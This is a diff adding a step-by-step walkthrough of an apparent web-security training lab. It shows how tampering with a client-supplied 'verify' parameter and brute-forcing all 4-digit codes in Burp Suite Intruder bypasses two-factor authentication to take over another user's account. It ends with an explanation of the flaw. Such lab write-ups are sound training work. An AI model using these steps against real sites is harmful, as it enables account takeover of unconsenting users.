@@ -3080,4 +3080,344 @@ Correct User Verified
 ```
 
 ---
+# Bypassing 2FA Using a Flawed Verification Logic
+
 ![2fal](images/2fal.png)
+
+## Step 1: Login to Your Own Account
+
+1. Open the login page.
+2. Login using your own credentials.
+
+Example:
+
+```text
+Username: wiener
+Password: peter
+```
+
+3. Submit the login form.
+
+---
+
+## Step 2: Investigate the 2FA Request
+
+1. Complete the login process until you reach the 2FA page.
+2. In Burp Suite, locate:
+
+```http
+POST /login2
+```
+
+3. Observe the request parameters.
+
+Example:
+
+```http
+POST /login2
+
+mfa-code=1234
+verify=wiener
+```
+
+Notice:
+
+```text
+The verify parameter determines which user's account is being verified.
+```
+
+This is the vulnerability.
+
+---
+
+## Step 3: Logout
+
+1. Logout of your account.
+2. Return to the login page.
+
+---
+
+# Generate Carlos's 2FA Code
+
+## Step 4: Send GET /login2 to Repeater
+
+1. Find the request:
+
+```http
+GET /login2
+```
+
+2. Right-click.
+3. Select:
+
+```text
+Send to Repeater
+```
+
+---
+
+## Step 5: Modify verify Parameter
+
+Original:
+
+```http
+GET /login2?verify=wiener
+```
+
+Change to:
+
+```http
+GET /login2?verify=carlos
+```
+
+4. Click:
+
+```text
+Send
+```
+
+This causes:
+
+```text
+A temporary 2FA code to be generated for Carlos.
+```
+
+---
+
+# Prepare for Brute Force
+
+## Step 6: Login Again
+
+1. Go to the login page.
+2. Login using your own credentials.
+
+Example:
+
+```text
+Username: wiener
+Password: peter
+```
+
+3. Reach the 2FA page.
+
+---
+
+## Step 7: Submit Invalid Code
+
+Enter any invalid code.
+
+Example:
+
+```text
+0000
+```
+
+Submit the form.
+
+---
+
+## Step 8: Send POST /login2 to Intruder
+
+1. Locate:
+
+```http
+POST /login2
+```
+
+2. Right-click.
+3. Select:
+
+```text
+Send to Intruder
+```
+
+---
+
+# Configure Intruder
+
+## Step 9: Modify verify Parameter
+
+Change:
+
+```http
+verify=wiener
+```
+
+to:
+
+```http
+verify=carlos
+```
+
+---
+
+## Step 10: Add Payload Position
+
+Add payload markers around:
+
+```http
+mfa-code=§0000§
+```
+
+Example:
+
+```http
+POST /login2
+
+mfa-code=§0000§&verify=carlos
+```
+
+---
+
+## Step 11: Configure Payload
+
+1. Open the **Payloads** tab.
+2. Select:
+
+```text
+Simple list
+```
+
+3. Use all possible 4-digit codes.
+
+Example:
+
+```text
+0000
+0001
+0002
+...
+9999
+```
+
+or use:
+
+```text
+Numbers
+```
+
+Configuration:
+
+```text
+From: 0000
+To: 9999
+Step: 1
+```
+
+---
+
+## Step 12: Start Attack
+
+1. Launch the Intruder attack.
+2. Wait for completion.
+
+---
+
+# Identify Correct 2FA Code
+
+## Step 13: Find Successful Response
+
+Observe the:
+
+```text
+Status
+```
+
+column.
+
+Most responses:
+
+```text
+200 OK
+```
+
+Successful response:
+
+```text
+302 Found
+```
+
+This indicates:
+
+```text
+Valid 2FA code discovered.
+```
+
+---
+
+## Step 14: Open Successful Response
+
+1. Right-click the successful request.
+2. Select:
+
+```text
+Show response in browser
+```
+
+or
+
+```text
+Open in browser
+```
+
+3. Load the URL.
+
+---
+
+# Solve the Lab
+
+## Step 15: Access My Account
+
+1. Click:
+
+```text
+My Account
+```
+
+2. You are now authenticated as:
+
+```text
+carlos
+```
+
+3. The lab is solved.
+
+---
+
+# Vulnerability Explanation
+
+### Intended Flow
+
+```text
+Login as User
+      ↓
+Generate User's 2FA Code
+      ↓
+Verify Same User's Code
+      ↓
+Account Access
+```
+
+### Vulnerable Flow
+
+```text
+Login as Wiener
+      ↓
+Change verify=wiener
+      ↓
+verify=carlos
+      ↓
+Brute-force Carlos's 2FA Code
+      ↓
+Access Carlos's Account
+```
+
+The application trusts the:
+
+```text
+verify
+```
+
+parameter supplied by the client instead of securely binding the verification process to the authenticated user.
+
+---
